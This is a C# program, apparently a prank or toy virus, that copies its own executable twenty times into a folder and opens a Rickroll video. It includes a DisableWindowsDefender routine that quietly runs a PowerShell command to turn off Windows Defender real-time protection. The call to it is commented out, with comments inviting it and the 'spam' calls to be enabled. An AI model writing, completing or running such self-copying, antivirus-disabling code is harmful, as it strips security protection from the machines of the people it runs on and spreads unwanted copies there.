using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;

namespace SelfReplicatingCode
{
    class replicate
    {
        private const int MAX_ITERATIONS = 20;

        static void Main(string[] args)
        {
            string fileName = Assembly.GetExecutingAssembly().Location;
            string directoryPath = Path.Combine(Path.GetDirectoryName(fileName), "generated-files");

            // create the directory if it doesn't exist
            if (!Directory.Exists(directoryPath))
            {
                Directory.CreateDirectory(directoryPath);
            }

            for (int i = 0; i < MAX_ITERATIONS; i++)
            {
                string newFileName = Path.Combine(directoryPath,
                    Path.GetFileNameWithoutExtension(fileName) + i + Path.GetExtension(fileName));
                File.Copy(fileName, newFileName, true);
            }

            // DisableWindowsDefender(); // Disable Windows Defender

            // Alger(); // Insert in loop if you want to say alger everytime you replicate (spam)

            PlayRickRoll(); // Insert in loop if you want to rickroll everytime you replicate (spam)
        }

        static void DisableWindowsDefender()
        {
            string command = "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true";

            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
            processInfo.RedirectStandardError = true;
            processInfo.RedirectStandardOutput = true;
            processInfo.CreateNoWindow = true;
            processInfo.UseShellExecute = false;

            Process process = new Process();
            process.StartInfo = processInfo;
            process.Start();

            // read the output of the command
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            Console.WriteLine("Output: " + output);
            Console.WriteLine("Error: " + error);
        }

        static void Alger()
        {
            string command = "echo 'alger'";

            ProcessStartInfo processInfo = new ProcessStartInfo("/bin/bash", "-c \"" + command + "\"");
            processInfo.RedirectStandardError = true;
            processInfo.RedirectStandardOutput = true;
            processInfo.CreateNoWindow = true;
            processInfo.UseShellExecute = false;

            Process process = new Process();
            process.StartInfo = processInfo;
            process.Start();

            // read the output of the command
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            Console.WriteLine("Output: " + output);
            Console.WriteLine("Error: " + error);
        }

        static void PlayRickRoll()
        {
            string url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

            // Launch the default web browser to play the video
            System.Diagnostics.Process.Start(url);
        }
    }
}
